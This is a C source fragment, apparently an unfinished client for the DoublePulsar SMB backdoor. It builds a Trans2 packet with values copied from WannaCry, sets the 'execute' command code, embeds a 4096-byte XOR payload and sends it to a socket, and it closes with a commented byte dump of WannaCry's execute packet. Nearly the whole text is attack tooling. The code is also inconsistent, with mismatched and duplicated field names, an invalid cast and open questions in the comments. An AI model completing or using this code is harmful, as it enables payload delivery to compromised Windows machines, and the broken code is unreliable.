typedef struct {
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength; 
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand; 
	uint32_t NtStatus; //0x00000000
	uint8_t flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProccessID; //0xfeff
	uint16_t UserID; 
	uint16_t multipleID;                 //must have a multiplex ID
  
  	//trans2 stuff
   	uint8_t wordCount;              //setupcount(1) + wordcount (14)
   	uint16_t totalParameterCount;
   	uint16_t totalDataCount;

   	uint16_t ParamCountTotal;
   	uint16_t DataCountTotal;

   	uint8_t reserved1;
   	uint16_t flags;
   	uint32_t timeout;   // 0x25 0x89 0x1a 0x00
   	uint16_t reserved2;

   	uint16_t ParamCountMax;
   	uint16_t DataCountMax;
   	uint16_t ParamCount;
   	uint16_t ParamOffset;
   	uint16_t DataCount;
   	uint16_t DataOffset;

   	uint16_t SetupCount;
   	uint16_t SetupData;

   	uint8_t reserved3;
   	uint16_t function; //0x0e00 also known as Subcommand in Wireshark
   	uint16_t ByteCount; //4109 or 0x0d 0x10
   	uint8_t padding;

   	unsigned char SESSION_SETUP_PARAMETERS[13]; //Wannacry uses 12 as the size but need NULL terminator
   	unsigned char payload[4096];
} SMB_DOUBLEPULSAR_REQUEST;

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

//Size of SMB_TRANS2_REQ = 82
void send_function()
{
	      SMB_DOUBLEPULSAR_REQUEST uploadpacket;
      	//set SMB values
      	uploadpacket.ProtocolHeader[0] = '\xff';
      	uploadpacket.ProtocolHeader[1] = 'S';
      	uploadpacket.ProtocolHeader[2] = 'M';
      	uploadpacket.ProtocolHeader[3] = 'B';
      
      	uploadpacket.SmbCommand = 0x32; //Trans2 
      	uploadpacket.Flags = 0x18;
      	uploadpacket.Flags2 = SWAP_SHORT(0xC007);
      
	      uploadpacket.UserID = SWAP_SHORT(response.UserID); 
      	uploadpacket.ProcessID = SWAP_SHORT(0xfeff);        //response.ProcessID; //Default value:  0xfeff;
      	uploadpacket.signature = 0x00000000;
      	uploadpacket.TreeID = SWAP_SHORT(response.TreeID);  //grab from SMB response
      	uploadpacket.MultiplexID = 0x41; //find out the true value, should it be 41?

      	//trans2 packet stuff
      	uploadpacket.wordCount = SWAP_SHORT(0x0F); // 0x0F == 15 convert to hex?
      
      	//Copied from Wannacry
      	uploadpacket.totalParameterCount = SWAP_SHORT(0x0C); //0x0C == 12 convert to hex?
        uploadpacket.totalDataCount = SWAP_SHORT(4096); //convert to hex?
    
      	uploadpacket.ParamCountTotal = SWAP_SHORT(1);
      	uploadpacket.DataCountTotal = SWAP_SHORT(0);
        uploadpacket.reserved1 = SWAP_SHORT(0);
        uploadpacket.flags = SWAP_SHORT(0);         //FIX FLAGS to another name in SMB packet
        
        //trying little endian format for timeOut
        uploadpacket.Timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
        //little endian PING command upload.packet.Timeout = SWAP_WORD(0x00ee3401);
      	//0x866c3100 = PING command from somewhere else
        
        uploadpacket.reserved2 = SWAP_SHORT(0);
        
      	uploadpacket.ParamCountMax = SWAP_SHORT(1);         //value from wannacry
      	uploadpacket.DataCountMax = SWAP_SHORT(0);          //value from wannacry
      	uploadpacket.ParamCount = SWAP_SHORT(12);           //value from wannacry
      	uploadpacket.ParamOffset = SWAP_SHORT(66);          //value from wannacry but no idea where this is from 4096 + sizeof(SMB_DOUBLEPULSAR_REQUEST) + (1 * 2) - 4;
      	uploadpacket.DataCount = SWAP_SHORT(4096);          //value from wannacry
      	uploadpacket.DataOffset = SWAP_SHORT(78);           //value from wannacry
      	uploadpacket.SetupCount = SWAP_SHORT(1);            //value from wannacry
      	uploadpacket.function = SWAP_SHORT(0x000e);         //original 0x0e00
      	uploadpacket.byteCount = SWAP_SHORT(4109);          //convert to hex?
        
        //configure SESSION_SETUP_PARAMETERS here
        
       
        //copy XOR PAYLOAD
        memcpy(uploadpacket.payload, XOR_PAYLOAD, 4096);
        
        //send to socket here
        send(socket, (char*)uploadpacket,4178,0);
}

/*
//Wannacry DoublePulsar Execute Payload Trans2 Packet extracted from Wannacry:
00 00 00 		//NetBIOS header
10 4E 			//SMB Len
FF 53 4D 42		//SMB1
32			//SMB Command: Trans2
00 00 00 00 		//NT Status
18			//Flags1
07 C0			//Flags2
00 00 			//Pid Hi
00 00 00 00 00 00 00 00 //Signature
00 00 			//Reserved
00 08 			//TreeID
FF FE 			//Process ID
00 08			//user ID
42 00			//Multiple ID

0F			   //WordCount
0C 00 			//TotalParamCount
00 10			//TotalDataCount
01 00			//Max Param Count
00 00			//Max Data Count
00			//Max Setup Count
00			//Reserved
00 00			//Flags
25 89 1A 00		//Timeout -> Execute command
00 00 			//Reserved
0C 00 			//Parameter Count
42 00			//Parameter Offset
00 10			//Data Count ( same as: TotalDataCount )
4E 00			//Data Offset
01			//Setup Count
00 			//Reserved
0E 00			//Subcommand: SESSION_SETUP
0D 10			//ByteCount
00      //Padding
00 00 00 00 00 00 00 00 00 00 00 00 //SESSION_SETUP Parameters
*/


